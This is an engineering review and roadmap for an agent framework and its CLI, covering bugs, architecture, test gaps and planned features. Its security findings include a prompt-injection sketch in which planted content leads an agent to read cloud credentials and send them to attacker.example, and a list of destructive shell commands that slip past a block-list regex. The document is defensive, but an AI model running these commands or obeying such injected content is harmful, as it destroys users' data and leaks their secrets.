# Bog Agents — Holistic Review & Roadmap (May 16, 2026)

> **Scope:** Whole monorepo. Deep on `libs/bog-agents/` (SDK) and `libs/cli/` (CLI); light pass on `acp`, `harbor`, `vscode-extension`, `partners`, `daemon`.
> **Lens:** OSS framework + CLI that strangers run on real codebases.
> **Method:** Five parallel reviewers — SDK deep-dive, CLI deep-dive, security + supply chain, satellite light pass, competitor feature-gap (Claude Code, Cursor/Windsurf, Aider, Cline/Continue/Roo Code).
> **Companion doc:** `docs/PRINCIPAL_REVIEW.md` (May 2026). This review extends that one — issues already covered there are flagged ↺ and not re-litigated. Issues with no marker are **new findings**.
> **Verdict in one line:** The core is genuinely differentiated and security-conscious; the perimeter (vertical-market middleware, eager imports, missing MCP timeout, Windows-secret claims) is what's keeping it from a credible 1.0 for OSS strangers.

---

## 0. Executive Summary

Bog Agents is two products in one trench coat: a horizontal agent framework (`libs/bog-agents/`) on LangGraph with 102 middleware modules, and a Textual TUI (`libs/cli/`) that wires them into a daily-driver CLI. Plus a daemon, an ACP-for-Zed bridge, a VS Code extension, a Terminal Bench harness, and a Daytona sandbox shim. **Real assets few competitors have**: dreamscape long-term memory, daemon-as-shared-context, multi-repo+worktree+sandbox stack, hallucination/citations/fact-check middleware, MCP trust + OAuth, air-gapped mode.

**What's blocking OSS-stranger trust today:**

1. **Vertical-market middleware ships as stub code with a "Production/Stable" classifier.** `financial_data.fetch_quote` literally returns `price=0.0` with a `"Populate with actual data"` note. `agent_teams.assign_task` and `multi_agent_orchestrator.spawn_agent_thread` are pure list-append theater — no agent ever runs. ~5,000 LOC across 14 modules will be the first thing skeptical OSS readers find. (P0-A)
2. **`bog_agents/middleware/__init__.py` eagerly imports 95 modules** — directly contradicting the lazy-import contract CLAUDE.md describes. Anyone doing `from bog_agents.middleware import X` pays the full cost. (P0-B)
3. **SSRF + local-file-read in `BrowserAgentMiddleware`** — `urlopen` follows `file://`, `http://169.254.169.254/...` (cloud metadata), RFC1918, loopback. Adversarial content can instruct the model to fetch AWS keys and exfiltrate via a second tool call. (P0-C)
4. **MCP startup has no timeout anywhere** — a slow `npx -y …` server bricks first paint indefinitely. There is no `wait_for`/`timeout` in 726 lines of `mcp_tools.py`. (P0-D)
5. **Windows `vars.toml` advertises "mode 0600" but silently isn't.** `chmod` on Windows is a no-op — the file ends up readable by the standard "Users" group. The docstring lies. (P0-E)
6. **CLAUDE.md has already drifted** (SDK version is pinned by range not exact; slash commands are now in `command_registry.get_slash_commands()` not autocomplete.py tuples). Contributors following the doc edit the wrong files. (P0-F)
7. **`/telephone` already exists** (good — user-requested feature is shipped). **`/sidecar` is missing** and is genuinely novel — no competitor has this exact thing. (Feature gap T-1)

**Resilience strengths worth preserving** (the prior review documented these; they haven't regressed):

- CVE-keyed dependency floors (`langchain-core CVE-2026-40087`, `requests CVE-2026-25645`, `pyjwt CVE-2026-32597`, `pillow CVE-2026-40192`, `langsmith` pinned for `GHSA-rr7j-v2q5-chgv`).
- PyPI publishing via OIDC Trusted Publishers (no long-lived tokens).
- `pull_request` (not `pull_request_target`) workflows; fork-PRs blocked from self-hosted runners.
- `_panic.py` redaction patterns covering `sk-…`, `xoxb-…`, `ghp_…`, JWTs, AKIA, generic `api[_-]?key=`.
- `LocalShellBackend` defaults `inherit_env=False`.
- `FilesystemBackend._resolve_path` rejects symlinks via `O_NOFOLLOW`.

**Bottom line.** This is genuinely two-to-three sprints from being a credible 1.0 for OSS strangers — provided the vertical-market cluster is moved or relabeled, the eager imports are fixed, the SSRF is gated, the MCP loader gets timeouts, and the Windows-permissions story is made honest. The killer-features section below has enough surface area to outpace every competitor at once if you bite half of it.

---

## 1. Severity-rated issue list

Naming convention: **P0** = ship-blocker for the OSS-stranger target, **P1** = serious but not blocking, **P2** = polish. **↺** = already documented in `docs/PRINCIPAL_REVIEW.md`. Everything else is new.

### 1.1 P0 — Ship-blockers

#### P0-A. Vertical-market middleware is aspirational stub code shipping with a "Production/Stable" classifier
**Files:** `libs/bog-agents/bog_agents/middleware/{financial_data,due_diligence,earnings_analysis,tax_optimization,portfolio_analysis,market_sentiment,peer_comparison,meeting_prep,regulatory_alerts,regulatory_impact,scenario_engine,client_knowledge_base,client_reports,firm_deployment}.py` + `libs/bog-agents/bog_agents/middleware/{agent_teams,multi_agent_orchestrator}.py`. Classifier at `libs/bog-agents/pyproject.toml:13`.
**Evidence:**
- `financial_data.py:217-235` — `fetch_quote("AAPL")` returns `QuoteData(price=0.0, ...)` with text *"Note: Populate with actual data from the source API."*
- `agent_teams.py:132-155` — `assign_task` appends a record to `_team_tasks: list`; no agent is ever invoked.
- `multi_agent_orchestrator.py:76-94` — `spawn_agent_thread` appends an `AgentThread` dict and returns `"Spawned thread"`; no graph runs.
- Same pattern across the remaining 12 vertical modules.
**Impact:** An OSS user who reads the README and enables `enable_financial_data=True` gets tools that **lie to the LLM**. The model dutifully calls `fetch_quote("AAPL")` and shows `$0.00` to the user. Combined with the "Production/Stable" classifier this is a trust-burning footgun.
**Fix:** Move the 14 vertical modules to a separate `bog-agents-finance` extras package, **or** prefix every tool name with `template_`, every middleware docstring with a **STUB — NOT FOR PRODUCTION USE** banner, every system-prompt with the same, and downgrade the package classifier to `4 - Beta` until it's all real or all gone. The cleanest call is extraction: `bog-agents` should be a horizontal framework; FA-specific tooling belongs in a sister repo.

#### P0-B. `bog_agents/middleware/__init__.py` is eagerly importing 95 modules
**File:** `libs/bog-agents/bog_agents/middleware/__init__.py:50` onward — 95 `from bog_agents.middleware.X import Y` lines.
**Evidence:** CLAUDE.md explicitly states *"Middleware uses `_LAZY_IMPORTS` dict and `__getattr__` in `__init__.py` to keep `import bog_agents` fast. Follow this pattern when adding new middleware."* That pattern lives **only** in `bog_agents/__init__.py:13-124`. The submodule's `__init__.py` does the opposite — pulling in `aiohttp`, `subprocess`, every vertical-market module, the browser agent, the computer-use stack, etc. `tests/unit_tests/test_lazy_import_health.py:22` checks the top-level package but not the submodule.
**Impact:** Any IDE-suggested import — `from bog_agents.middleware import FilesystemMiddleware` — pays the full price. Startup is slower than it advertises; install footprint expands on first use.
**Fix:** Mirror the `_LAZY_IMPORTS` + `__getattr__` pattern inside `middleware/__init__.py`. Add a CI test that asserts `python -c "import bog_agents.middleware"` doesn't import `aiohttp` or any vertical-market module.

#### P0-C. SSRF + local-file-read via `BrowserAgentMiddleware`
**Files:** `libs/bog-agents/bog_agents/middleware/browser_agent.py:91` (`web_fetch`), `:129` (`api_request`); allowlist gate at `:66-69`.
**Evidence:** `urllib.request.urlopen(url, ...)` with `allowed_domains=None` default = "allow everything", and `api_request` doesn't even consult the allowlist. `urllib.request` follows `file://`, `ftp://`, `http://169.254.169.254/...` (AWS/GCP/Azure cloud metadata), `http://127.0.0.1`, RFC1918 ranges.
**Exploit sketch:** Adversarial content (a README the model reads, a web-search result, an MCP tool description) tells the model `web_fetch("file:///home/user/.aws/credentials")` or `api_request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")`. Keys land in tool output. Second call: `api_request("https://attacker.example/?leak=…")`. Done.
**Fix:** Reject non-`http(s)` schemes. Resolve hostname; block loopback, link-local `169.254/16`, RFC1918, ULA, IPv6 site-local, `::1`. Apply the same gate to `api_request`. Disable or gate redirects. Mirror the check at every `urlopen`/`httpx` callsite (`browser_agent.py`, `start_preview_server`, anywhere else).

#### P0-D. MCP loading has no timeout anywhere — frozen first paint
**File:** `libs/cli/bog_agents_cli/mcp_tools.py` (726 LOC, **zero** `wait_for`/`timeout` references).
**Evidence:** `main.py:152 _preload_session_mcp_server_info` awaits `resolve_and_load_mcp_tools(...)` directly. A user with a stale `~/.mcp.json` that points at an `npx -y …` server (cold cache, 60s download) or a `pip install`-on-first-run server, or an SSE/OAuth server waiting for browser auth, sees a frozen banner with no way out short of Ctrl+C.
**Fix:** Wrap each server start in `asyncio.wait_for(..., timeout=15)`. On timeout, mark the server failed, log to the welcome banner ("⚠ MCP server `slack` did not start in 15s — disabled"), continue startup. Expose `MCP_STARTUP_TIMEOUT_SECONDS` env knob. Add a regression test with a fake stdio MCP that never speaks.

#### P0-E. Windows `vars.toml` advertises 0600 protection but is world-readable
**Files:** `libs/cli/bog_agents_cli/vars_store.py:160` (`_DEFAULT_CONFIG_DIR.chmod(0o700)`), `:187` (`_VARS_PATH.chmod(0o600)`); `io_utils.py:39` (silent `chmod(mode)` skip on Windows).
**Evidence:** Both `chmod` calls are swallowed by `OSError: pass` on Windows. The vars_store docstring advertises mode 0600 file permissions. Reality: standard Windows ACL, readable by every member of the local `Users` group on a shared/RDP machine. `is_using_toml_fallback()` returns True but doesn't tell the user the fallback is unprotected.
**Fix:** On Windows, when falling back to TOML, set the ACL to owner-only via `icacls` (or `win32security` if `pywin32` is available). If neither works, **refuse** the fallback with a hard error pointing at `pip install keyrings.alt` or env-var setup. Update the docstring to match what actually happens. The same applies to all writes under `~/.bog-agents/{sessions,checkpoints,crash,dreamscape}` — currently created at umask default (0644) on Linux.

#### P0-F. CLAUDE.md drift will mislead contributors today
**Files:** `CLAUDE.md` lines under *Adding a New Model Provider* and the CLI overview; `libs/cli/pyproject.toml:32`; `libs/cli/bog_agents_cli/widgets/autocomplete.py:98`.
**Evidence:**
- CLAUDE.md: *"SDK version pinned exactly in `libs/cli/pyproject.toml`"* — actual is `bog-agents>=0.7.0,<1.0.0` (range). Either the doc is wrong or the pin regressed.
- CLAUDE.md: *"Slash commands defined in `libs/cli/bog_agents_cli/widgets/autocomplete.py` as `(name, description, hidden_keywords)` tuples"* — actual is `command_registry.get_slash_commands()` sourced from the `commands/` package; autocomplete.py just imports the result.
- CLAUDE.md *Adding a New Model Provider* step 1 mentions `model_config.py` but says nothing about updating `api_keys.WELL_KNOWN_API_KEYS` (which is out of sync — see P0-G).
- CLAUDE.md also describes `libs/partners/` as four sandbox integrations (daytona, modal, runloop, quickjs) — reality: only daytona has source. Modal and quickjs don't exist in this tree at all; `libs/partners/runloop/` is a ghost directory with no `pyproject.toml`, no `langchain_runloop/*.py`, only `__pycache__/.venv/.benchmarks/.pytest_cache` artifacts.
- The daemon (most active satellite, v0.8.7, Beta) is not mentioned at all.
**Fix:** Update CLAUDE.md to match reality. Add a CI grep guard that any sentence claiming "pinned exactly" actually corresponds to an `==` constraint in the listed file. Delete `libs/partners/runloop/` or implement it. Add a section documenting `libs/daemon/`.

#### P0-G. API-key registries `model_config.PROVIDER_API_KEY_ENV` and `api_keys.WELL_KNOWN_API_KEYS` are out of sync
**Files:** `libs/cli/bog_agents_cli/model_config.py:228` (17 providers) vs `libs/cli/bog_agents_cli/api_keys.py:16-35` (14 providers).
**Evidence:** Missing from `WELL_KNOWN_API_KEYS`: Perplexity (`PPLX_API_KEY`), Baseten, HuggingFace (`HUGGINGFACEHUB_API_TOKEN`), IBM (`WATSONX_APIKEY`), Litellm, Together, Vertex AI. Plus a naming mismatch — `model_config` wants `PPLX_API_KEY` (per `langchain-perplexity`) but users will type `PERPLEXITY_API_KEY` from memory.
**Impact:** A user runs `/vars set PERPLEXITY_API_KEY …`; `inject_vault_keys_into_env()` doesn't inject it (not in `WELL_KNOWN_API_KEYS`); model creation fails with "no credentials" despite the key being in the vault. Silent footgun.
**Fix:** Derive `WELL_KNOWN_API_KEYS` from `PROVIDER_API_KEY_ENV` (single source of truth). Add a Perplexity alias map. Add a test asserting the two registries agree.

#### P0-H. Encoding bombs in config readers (Windows non-en-US locales)
**Files (no `encoding=` on `read_text`):** `libs/cli/bog_agents_cli/hooks.py:67`, `extensions.py:101`, `oauth_mcp.py:105,139,173`, `profiles.py:151`, `keybindings.py:68`, `agent.py:593,665`, `config.py:1454`, `cmd_daemon.py:39,47`, `daemon_client.py:34,49`. `pyproject.toml` blanket-ignores `PLW1514`.
**Impact:** On Windows with a non-ASCII project name, hooks command line containing emoji, or a skill file with smart quotes, these decode via cp1252/cp932/cp949 → hard `UnicodeDecodeError` on startup. Lint will never warn because `PLW1514` is globally ignored.
**Fix:** Turn `PLW1514` on globally. Add `encoding="utf-8"` to every call. Mass edit + lint enforcement.

#### P0-I. Worktree `asyncio.ensure_future` fire-and-forget — tasks can be GC'd mid-flight
**File:** `libs/bog-agents/bog_agents/middleware/worktree.py:800-808`.
**Evidence:**
```python
_bg = asyncio.ensure_future(
    asyncio.gather(*(mw._run_task_in_worktree(t) for t in created_tasks), return_exceptions=True)
)
_ = _bg  # suppress "local variable assigned but never used"
```
`_bg` is a local that dies at function return; Python's asyncio docs explicitly warn that an un-rooted task may be garbage-collected mid-execution. If GC fires at the wrong moment the whole gather is silently cancelled and worktree branches/state may be inconsistent.
**Fix:** Standard recipe — store on `self` (`self._background_tasks: set[asyncio.Task] = set()`), add `done_callback` to discard from the set. Add a test that creates 10 tasks and asserts all complete after `await asyncio.sleep(0)`.

#### P0-J. Coupling to LangChain private API (`_DEFAULT_*` constants)
**File:** `libs/bog-agents/bog_agents/middleware/summarization.py:59-66`.
**Evidence:** Imports `_DEFAULT_MESSAGES_TO_KEEP`, `_DEFAULT_TRIM_TOKEN_LIMIT` from `langchain.agents.middleware.summarization` (leading underscores → private API). Constraint is `langchain>=1.2.11,<2.0.0`, meaning any 1.x patch is free to rename or drop those names without breaking semver.
**Impact:** A user `uv sync`-ing six months from now hits `ImportError` from inside `bog_agents` with no upstream remediation.
**Fix:** Inline these as constants in the SDK. Add a "test against latest 1.x langchain" CI matrix to catch the next break early.

#### P0-K. Dangerous-command regex has multiple bypasses (security theater)
**File:** `libs/bog-agents/bog_agents/backends/local_shell.py:39-58`.
**Evidence:** The `rm` pattern requires both `r` and `f` flags AND a leading `/`. Bypasses: `rm -r ~`, `rm -rf .` (no leading `/`), `find / -delete`, `find ~ -delete`, `cd / && rm -rf *`, `python -c "import shutil; shutil.rmtree('/')"`, `git clean -fdx /`. The `curl … | sh` pattern is bypassed by `curl … > /tmp/x && sh /tmp/x`. The pattern misses Windows entirely (`del /f /s /q`, `rmdir /s`, `format c:`, `cipher /w`).
**Reality:** The docstring acknowledges shell access is unrestricted and HITL is the real safeguard. The gate's existence misleads readers into thinking it's a security boundary.
**Fix:** Either delete the regex gate (cleanest) **or** demote it explicitly to "accident-catcher, not adversary-catcher" in docs and logs. Add the missing Linux patterns (`find … -delete`, `shutil.rmtree`, `git clean -fdx`) and Windows equivalents. Make `SafeToolsMiddleware` the default in the CLI (not the SDK) so the realistic safeguard is wired in by default.

---

### 1.2 P1 — Serious but not blocking

| # | What | Where | Fix |
|---|---|---|---|
| P1-1 | Webhook payloads include unredacted `tool_args` (file contents, inline API tokens, PII) | `libs/bog-agents/bog_agents/middleware/http_hooks.py:380-386` | Add opt-in `payload_filter: Callable`; default-redact secret-shaped keys |
| P1-2 | `_resolve_path` traversal check is substring-based | `libs/bog-agents/bog_agents/backends/filesystem.py:163-176` | Use `Path.parts` segment check; rewrite error message — the real safety is `relative_to(self.cwd)` at :178 |
| P1-3 | Middleware ordering is implicit, undocumented, position-load-bearing | `libs/bog-agents/bog_agents/graph.py:409-815` (~400-line `if f.enable_X: append` block) | Document order in `create_agent` docstring; add `before=`/`after=` API or anchor-keyed `middleware` map |
| P1-4 | `create_agent` appends default `Filesystem`/`Summarization` middleware **even when user supplied their own** | `libs/bog-agents/bog_agents/graph.py:799-808` | If a user-supplied middleware of the same type is present, skip the default append |
| P1-5 | Unbounded growth in cost tracker / audit trail / multi-agent orchestrator | `cost_tracker.py:127`, `audit_trail.py:103`, `multi_agent_orchestrator.py:63`, `worktree.py:674` | `deque(maxlen=N)` + page to disk for audit; document trade-offs |
| P1-6 | `legacy_feature_flags: Any` kwarg backdoor in `create_agent` | `libs/bog-agents/bog_agents/graph.py:196` | Set a release-targeted removal; raise immediately after deprecation cycle |
| P1-7 | `SSOAuthMiddleware` reads as enterprise auth but is a stub | `libs/bog-agents/bog_agents/middleware/sso_auth.py:262-279` | Rename to `MockAuthMiddleware`, add `NOTSECURE` banner, gate behind `demo_mode=True` warning |
| P1-8 | Skill loader doesn't reject symlinks | `libs/bog-agents/bog_agents/middleware/skills.py`, `hot_reload_skills.py` | Mirror the `is_symlink()` rejection from `plugin_system.py:320`; cap total skill bytes globally |
| P1-9 | Worktree/git ref names not separated by `--` from path args | `libs/bog-agents/bog_agents/middleware/{worktree.py:159, git_tools.py:159}` | Insert `--` before user-controlled refs; validate refs with `git check-ref-format` |
| P1-10 | MCP no timeout — already listed P0-D — but also bad `mcp.json` JSON parse path needs verification | `libs/cli/bog_agents_cli/mcp_tools.py`, `mcp_registry.py` | Wrap config parse in try/except with clear UX |
| P1-11 | `hooks.py:110` `start_new_session=True` is a no-op on Windows | `libs/cli/bog_agents_cli/hooks.py:110` | Detect Windows, use `CREATE_NEW_PROCESS_GROUP`; surface failed hook executions via TUI toast |
| P1-12 | Hook config cached forever (no reload on edit) | `libs/cli/bog_agents_cli/hooks.py:51-90` | Stat-and-reload; or add `/hooks reload` |
| P1-13 | Hook timeout hardcoded 5s, no per-hook config | `libs/cli/bog_agents_cli/hooks.py:111` | Read `timeout` from each hook entry; default 5s |
| P1-14 | Hooks are fire-and-forget — no deny/modify return contract | `libs/cli/bog_agents_cli/hooks.py:170` (`dispatch_hook`) | See **Feature T-2** below — this is also the #1 enterprise/safety competitor gap |
| P1-15 | Dreamscape `LifecycleSnapshot` has no `schema_version` | `libs/cli/bog_agents_cli/dreamscape/lifecycle.py:212` | Add `schema_version: int = 1`; gate `from_dict` on it; migrate gracefully |
| P1-16 | Dreamscape dream filenames collide within the same second | `libs/cli/bog_agents_cli/dreamscape/dream_engine.py:260,280` | Add millisecond precision or 4-digit suffix |
| P1-17 | Dreamscape writes don't use `atomic_write_text` (data-loss risk on Ctrl+C) | `dreamscape/lifecycle.py:217`, `domain.py:222,549`, `laws.py:715`, `dream_engine.py:281`, `telemetry.py:384` | Route all through `atomic_write_text(mode=0o600)` |
| P1-18 | `_keyring_available()` re-imports keyring + probes backend on every read | `libs/cli/bog_agents_cli/vars_store.py:79`, `api_keys.py:71` | Memoize at module level; clear on `/reload` |
| P1-19 | `bog-agents` SDK dep is `>=0.7.0,<1.0.0` (range, not pin) | `libs/cli/pyproject.toml:32` | Either pin exactly (per CLAUDE.md) **or** update CLAUDE.md and add weekly SDK-latest smoketest |
| P1-20 | `libs/harbor/.../backend.py:60` uses deprecated `asyncio.get_event_loop().run_until_complete()` | `libs/harbor/bog_agents_harbor/backend.py:60` | Replace with `asyncio.run()`; will error on Python 3.14 |
| P1-21 | `libs/acp/pyproject.toml:53` ships `Twitter = "https://x.com/LangChain"` | `libs/acp/pyproject.toml:53` | Replace with bogware URLs; `py.typed.py` → `py.typed` marker |
| P1-22 | `libs/partners/runloop/` is a ghost directory (no source, only `__pycache__`/`.venv`/`.pytest_cache`) | `libs/partners/runloop/` | Delete the directory; update CLAUDE.md |
| P1-23 | MCP tool descriptions inlined unsanitized → prompt injection vector | `libs/cli/bog_agents_cli/mcp_tools.py` | Length-cap, strip ANSI/control chars, fingerprint SSE/HTTP MCP URLs |
| P1-24 | GitHub Actions pinned by tag, not SHA | `.github/workflows/{ci,release,release-please,vscode-extension}.yml` | Pin to commit SHAs; add Dependabot/Renovate for actions |
| P1-25 | `BOG_PAT` long-lived PAT used in release-please workflow | `.github/workflows/release-please.yml` | Replace with a GitHub App if available |

### 1.3 P2 — Polish

| # | What | Where |
|---|---|---|
| P2-1 | `FeatureConfig` has 181 fields; should nest (`config.cost.budget_usd`, `config.git.enable_tools`) | `libs/bog-agents/bog_agents/feature_config.py` |
| P2-2 | `__all__ = list(_LAZY_IMPORTS.keys())` star-unpack trips `PLE0604` (`# noqa` band-aid) | `libs/bog-agents/bog_agents/__init__.py:127` |
| P2-3 | `max_turns` silently clamped to `[10, 1000]` with no warning | `libs/bog-agents/bog_agents/graph.py:847` |
| P2-4 | `BASE_AGENT_PROMPT` hardcoded as a 40-line string in graph.py despite `base_prompt.md` existing | `libs/bog-agents/bog_agents/graph.py:42-83` |
| P2-5 | `langchain-google-genai>=4.2.0` is a mandatory runtime dep | `libs/bog-agents/pyproject.toml` |
| P2-6 | Branch-name sanitizer at `worktree.py:704` drops Unicode letters silently | `libs/bog-agents/bog_agents/middleware/worktree.py:704` |
| P2-7 | `_DANGEROUS_PATTERNS` regex `r"rm\s+-[a-zA-Z]*r"` lacks `\b` anchor | `libs/bog-agents/bog_agents/backends/local_shell.py:42` |
| P2-8 | PyPI description is 600 chars; renders truncated on PyPI right-rail | `libs/cli/pyproject.toml:8` |
| P2-9 | OSC52 clipboard write uses `\a` terminator; should be `\x1b\\` (ST) for kitty/wezterm/iTerm2 | `libs/cli/bog_agents_cli/clipboard.py:30` |
| P2-10 | `io_utils.atomic_write_text` doesn't `fsync` the tempfile before rename — atomicity isn't guaranteed on power loss | `libs/cli/bog_agents_cli/io_utils.py` |
| P2-11 | `_observability._Registry` accumulates event names forever (no cardinality cap) | `libs/cli/bog_agents_cli/_observability.py` |
| P2-12 | `vars_store.py:86` `except (ImportError, Exception)` — `Exception` already covers `ImportError` | `libs/cli/bog_agents_cli/vars_store.py:86` |
| P2-13 | Plugin install runs `git clone` of arbitrary URLs with no signature / hash pinning | `libs/bog-agents/bog_agents/middleware/plugin_system.py:292-347` |
| P2-14 | `enhanced_skills.py:295` uses `tempfile.gettempdir() / "bog-agents-skills-cache"` (world-readable on shared systems) | `libs/bog-agents/bog_agents/middleware/enhanced_skills.py:295` |
| P2-15 | `web_fetch`/`api_request` echo response headers including `Set-Cookie`/`Authorization` back into conversation history | `libs/bog-agents/bog_agents/middleware/browser_agent.py` |
| P2-16 | `bog-agents` package — no SBOM, no `pip-audit` workflow | repo-wide |
| P2-17 | `VSCE_PAT` long-lived token (unavoidable per Marketplace) — rotate quarterly and scope to single extension | `.github/workflows/vscode-extension.yml:102` |

---

## 2. Architecture observations

### 2.1 Middleware sprawl — 102 modules, 38,483 LOC

The **top-5 by LOC** are genuine workhorses: `summarization.py` (1,505), `filesystem.py` (1,400), `worktree.py` (887), `skills.py` (861), `hybrid_search.py` (838). The remaining ~97 average **~370 LOC each** and follow a strikingly uniform pattern — `SYSTEM_PROMPT` const, `class XState(TypedDict)`, `_build_tools()`, `modify_request()`, `wrap_model_call()`, `awrap_model_call()`. This pattern smells of cargo-cult middleware. Most could be **30–50-line tool-collection helpers**, not full middleware. The 102-module headline number is also part of the brand — be honest about what's a workhorse vs. what's a thin shim.

**Recommendation:** Categorize middleware into three tiers in `__init__.py` and docs:
- **Core** (≈15–20): filesystem, summarization, worktree, skills, plan_mode, subagents, http_hooks, code_intelligence, repo_map, checkpointing, citations, hallucination_detection, audit_trail, dlp, cost_tracker.
- **Featured extensions** (≈30): voice_io, image_pdf_input, multi_repo, conversation_branch, browser_agent, computer_use, multi_edit, etc.
- **Templates / scaffolds** (everything else, including the vertical-market cluster after relabeling).

This re-organizes the surface without breaking imports and lets you market "20 production-stable, dozens of templates."

### 2.2 Subagent overlap

Five modules with overlapping concerns:
- `subagents.py` (705 lines) — real, used by `create_agent` (`graph.py:33-39`), provides the `task` tool. **Core.**
- `async_subagents.py` (669 lines) — remote LangGraph subagents (graph_id routed). **Justified separate layer.**
- `parallel_agents.py` (244 lines) — `asyncio.gather` over caller-supplied agents. **Different layer (fan-out helper).**
- `agent_teams.py` (215 lines) — pure TODO-list-with-team-jargon (P0-A). **Delete or rewrite.**
- `multi_agent_orchestrator.py` (224 lines) — pure record-keeper; threads never run (P0-A). **Delete or rewrite.**

Real layering is three (subagents / async_subagents / parallel_agents); the other two should either become real or vanish.

### 2.3 Plugin system maturity

`plugin_system.py:292-347 install_plugin` does `git clone` of arbitrary URLs the agent picks, loads the manifest, trusts the contents. Symlinks rejected (good). Permissions enum-checked (good). But:
- No code signing / hash pinning.
- No version pin in install.
- `_load_installed` runs unconditionally at middleware `__init__` — startup-time I/O proportional to installed plugin count.
- The manifest accepts `hooks` and `mcp_servers` fields that are stored but **never wired in this module** (no consumer in `grep`).

Calling this a "plugin marketplace" overstates what's there. Either:
- Build the consumer for `hooks`/`mcp_servers` (close the loop), **or**
- Rename to "plugin installer" and drop the marketplace framing.

### 2.4 `create_agent` is an 80+ kwarg god-function

`graph.py:175-197` accepts 50+ feature flags + `**legacy_feature_flags: Any` backdoor. `FeatureConfig` exists but the legacy kwarg path remains. Ordering of 50+ `if f.enable_X` branches is undocumented and load-bearing. `_validate_middleware_ordering` only catches declared `requires` violations — not soft conflicts (e.g., `DLPMiddleware` must redact before `AuditTrailMiddleware` records, but nothing enforces this).

**Recommendation:** Document the stack order. Add `before=`/`after=` anchors. Pick a deprecation cycle to remove `legacy_feature_flags`. Nest `FeatureConfig`.

### 2.5 `app.py` god class ↺

15,748 lines, 40 `run_worker` calls. Already documented in `docs/PRINCIPAL_REVIEW.md` and in `memory/project_app_py_refactor_plan.md` (refactor deferred 2026-05-07). Not re-litigating.

### 2.6 Two products in one repo

The 14-module vertical-market cluster (financial-advisor tooling) sits in a horizontal framework. The domain language (`advisor_id`, `FA-001`, FINRA Rule 3110 in `audit_trail.py:21-30`) leaks across module boundaries. **Strongest recommendation:** Split into:
- `bog-agents` — horizontal framework, ~20 core middleware
- `bog-agents-finance` — vertical FA tooling (when actually implemented)
- `bog-agents-cli` — TUI (already separate package)

This is the single highest-impact architectural cleanup. It makes the framework credible to non-FA OSS users without losing the FA story.

---

## 3. Test gaps that scare me

- **MCP startup with a hanging server** — no test exists; would catch P0-D.
- **`ParallelWorktreeMiddleware._run_task_in_worktree`** — no test under `tests/unit_tests/middleware/`; would catch P0-I.
- **`test_killer_features.py` (598 lines, 67 tests)** — proves in-memory dataclasses don't crash; doesn't prove the vertical-market middleware does anything useful. End-to-end with fake LLM calling the tools is missing.
- **`_validate_middleware_ordering` with realistic stacks** — only synthetic `requires` smoke today.
- **`atomic_write_text` cleanup on `KeyboardInterrupt`** — likely untested; testing requires subprocess.
- **`_panic.py` redaction** — easy parametrized test (`sk-…`, `ghp_…`, AKIA, JWT) missing despite the privacy claims.
- **`vars_store.py` Windows ACL behavior** — no test asserts real perms on Windows.
- **`_settings_cascade.py` site-level layer** — CLAUDE.md mentions site precedence; tests only cover home + project (2 layers).
- **Cross-key-registry agreement** — no test asserts `WELL_KNOWN_API_KEYS ⊆ PROVIDER_API_KEY_ENV` (would catch P0-G).
- **Cost tracker / audit trail unbounded growth** — no soak test.
- **Plugin install with hostile source URL** — no test exercises argv injection or symlink-bearing manifests.
- **Filesystem symlink rejection** — `O_NOFOLLOW` path likely untested via real symlink (tests use virtual paths).
- **Help-screen drift** — `tests/unit_tests/test_args.py:316` covers top-level argparse; **does not** cover slash-command-list drift or subcommand-specific help.
- **`autocomplete.py` SLASH_COMMANDS coverage** — no test asserts every command in `commands/*.py` has matching autocomplete coverage.
- **MCP TLS error categorization** — `fetch_remote_catalog` empty-result is tested; error categories are not.
- **Vertical-market middleware tools** — 14 modules, ~4,700 LOC tested mostly with `init` + `tool_names_set` assertions. No `wrap_model_call` exercise; no end-to-end-with-fake-LLM tests.

---

## 4. OSS-readiness blockers

1. **Default-model surprise.** `get_default_model()` (`graph.py:97`) returns `ChatAnthropic("claude-sonnet-4-6")` even when only `OPENAI_API_KEY` is set. Detect first available credential; pick a default that works.
2. **Heavy default deps.** `langchain-google-genai>=4.2.0,<5.0.0` is mandatory even for Anthropic-only users. Move to `[project.optional-dependencies.google]`. Same for any other provider-specific dep that's not Anthropic.
3. **Production-stable classifier** vs. stub vertical middleware (P0-A, P0-D). Downgrade to Beta until cleaned up.
4. **CLAUDE.md drift** (P0-F). Contributors following the doc do the wrong thing.
5. **`license = { text = "MIT" }`** with no `License-File`. Many packagers want SPDX-style + file.
6. **Telemetry guarantee unstated.** `_observability.py`, `langsmith_integration.py`, webhook hooks could emit; nothing currently does without opt-in, but say so explicitly: *"No network calls are made unless you enable X, Y, Z."*
7. **First-run wizard missing.** A stranger `pipx install bog-agents-cli && bog-agents` lands at a Textual UI with a red-banner "no API key" after picking a model. The recommended path (`/keys`, `/vars`, model picker) is hidden behind slash commands they don't know exist. Add a one-screen wizard at first launch.
8. **PyPI description is 600 chars marketing pitch** — renders truncated. Cut to 250.
9. **No SBOM / `pip-audit` workflow.** Add a CI job that runs `uv export | pip-audit -r -`.
10. **No `cross-platform-notes.md` link** from README or `/doctor` output. Surface it.

---

## 5. Killer features — the comprehensive roadmap

Ranked by impact × leverage. **T-#** = top-tier, **M-#** = medium-tier, **D-#** = differentiation play, **U-#** = under-marketed (already-shipped, needs surfacing). Effort = S/M/L/XL. The two user-requested features are T-1 and T-3.

### 5.1 T-tier — Build these next (top 10)

#### T-1. `/sidecar` — isolated subagent Q&A while main work proceeds **(user-requested)**
**What:** A new slash command that opens a fresh subagent thread with **read-only** tools (`Read`, `Glob`, `Grep`, `web_search`) and a one-time snapshot of the parent's conversation summary. Answers stream back into the main transcript as a quoted block. **The main agent's plan, todos, and uncommitted edits are untouched.**
**Why:** Users routinely break flow mid-task to ask "how does X work?" — and currently lose loaded context. No competitor offers exactly this single-keystroke pattern. Closest cousins: Cursor 2.0 multi-agent panes, Claude Code Task tool, Roo Code Ask mode.
**Effort:** M. **Impact:** Critical (user mandate + genuine differentiator).
**Where:** Insert SlashCommandSpec next to `/telephone` in `libs/cli/bog_agents_cli/commands/general.py`. New `libs/cli/bog_agents_cli/sidecar.py` runner that wraps `subagents.py` with a read-only allowlist. Reuse `widgets/thread_selector.py` for surfacing.

#### T-2. Blocking, decision-returning hooks (Claude Code 12-event parity)
